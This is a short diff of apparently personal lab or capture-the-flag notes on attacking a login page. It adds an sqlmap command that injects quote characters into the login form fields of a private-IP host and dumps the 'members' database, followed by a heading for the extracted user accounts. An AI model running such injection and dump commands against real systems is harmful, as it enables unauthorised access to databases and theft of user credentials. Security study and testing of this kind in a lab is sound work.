@@ -26,10 +26,12 @@ information_schema
 members
 mysql
 /////////////////
-
+Now need to dump all contents of the 'members' database
+////////////////
 sqlmap -u "http://192.168.32.49/checklogin.php" --data "myusername=%27&mypassword=%27&Submit=Login" -D members --dump
 
 --dump = display all info after scan has finished
+ //////////////////
  USER ACCOUNTS
  //////////////////
  UNAME: one
